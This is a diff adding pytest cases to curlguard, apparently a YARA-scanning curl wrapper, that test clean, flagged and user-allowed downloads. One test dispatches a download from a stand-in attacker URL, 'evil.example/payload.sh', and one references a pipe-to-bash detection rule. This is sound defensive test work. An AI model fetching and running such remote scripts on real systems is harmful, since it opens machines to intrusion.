@@ -1,3 +1,4 @@
+import hashlib
 import json
 import sys
 import types
@@ -57,6 +58,17 @@ def test_scanner_true_negative_stays_clean():
     assert result.clean is True
     assert result.rules_triggered == []
     assert result.status == "clean"
+
+
+def test_true_negative_example_content_stays_clean():
+    pytest.importorskip("yara")
+    scanner = YaraScanner([Path("src/curlguard/rules")])
+    result = scanner.scan(
+        b"#!/bin/bash\nset -e\necho \"curlguard clean test script\"\n"
+        b"echo \"This script is expected to pass without opening the review prompt.\"\n"
+    )
+    assert result.clean is True
+    assert result.rules_triggered == []
 
 
 def test_scanner_unavailable_status_is_explicit():
@@ -173,6 +185,34 @@ def test_wrapper_warn_mode_allows_scan_failure(temp_config, mock_ssl_detector, t
     assert event["user_decision"] == "allow"
 
 
+def test_wrapper_clean_download_reports_saved_location(temp_config, mock_ssl_detector, tmp_path, capsys):
+    scanner = MagicMock()
+    scanner.scan_file.return_value = ScanResult(
+        clean=True,
+        matches=[],
+        rules_triggered=[],
+        scan_time_ms=1.0,
+        status="clean",
+    )
+    logger = AuditLogger(temp_config.log_path)
+    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)
+
+    downloaded = tmp_path / "payload.download"
+    downloaded.write_text("ok")
+    wrapper._download_to_temp = lambda args: downloaded
+
+    output = tmp_path / "out.sh"
+    exit_code = wrapper.dispatch(["https://example.com/install.sh", "-o", str(output)])
+    logger.close()
+
+    captured = capsys.readouterr()
+    checksum = hashlib.sha256(b"ok").hexdigest()
+    assert exit_code == 0
+    assert f"saved to {output}" in captured.err
+    assert "2 bytes" in captured.err
+    assert f"sha256={checksum}" in captured.err
+
+
 def test_wrapper_block_mode_blocks_scan_failure(temp_config, mock_ssl_detector, tmp_path):
     temp_config.scan_failure_mode = "block"
     scanner = MagicMock()
@@ -229,6 +269,41 @@ def test_wrapper_quarantine_decision_moves_file(temp_config, mock_ssl_detector, 
     assert exit_code == 1
     assert len(quarantined) == 1
     assert quarantined[0].read_text() == "evil"
+
+
+def test_wrapper_allowed_flagged_download_reports_saved_location(
+    temp_config, mock_ssl_detector, tmp_path, monkeypatch, capsys
+):
+    scanner = MagicMock()
+    scanner.scan_file.return_value = ScanResult(
+        clean=False,
+        matches=["malware"],
+        rules_triggered=["suspicious_pipe_bash"],
+        scan_time_ms=1.0,
+        status="flagged",
+    )
+    logger = AuditLogger(temp_config.log_path)
+    wrapper = CurlWrapper(temp_config, scanner, logger, mock_ssl_detector)
+
+    downloaded = tmp_path / "allowed.download"
+    downloaded.write_text("allowed")
+    wrapper._download_to_temp = lambda args: downloaded
+
+    fake_tui = types.ModuleType("curlguard.tui")
+    fake_tui.prompt_user = lambda *args, **kwargs: "allow"
+    monkeypatch.setitem(sys.modules, "curlguard.tui", fake_tui)
+
+    output = tmp_path / "allowed.sh"
+    exit_code = wrapper.dispatch(["https://evil.example/payload.sh", "-o", str(output)])
+    logger.close()
+
+    captured = capsys.readouterr()
+    checksum = hashlib.sha256(b"allowed").hexdigest()
+    assert exit_code == 0
+    assert f"saved to {output}" in captured.err
+    assert "allowed by user decision" in captured.err
+    assert "7 bytes" in captured.err
+    assert f"sha256={checksum}" in captured.err
 
 
 def test_wrapper_unsupported_requests_passthrough(temp_config, mock_ssl_detector):
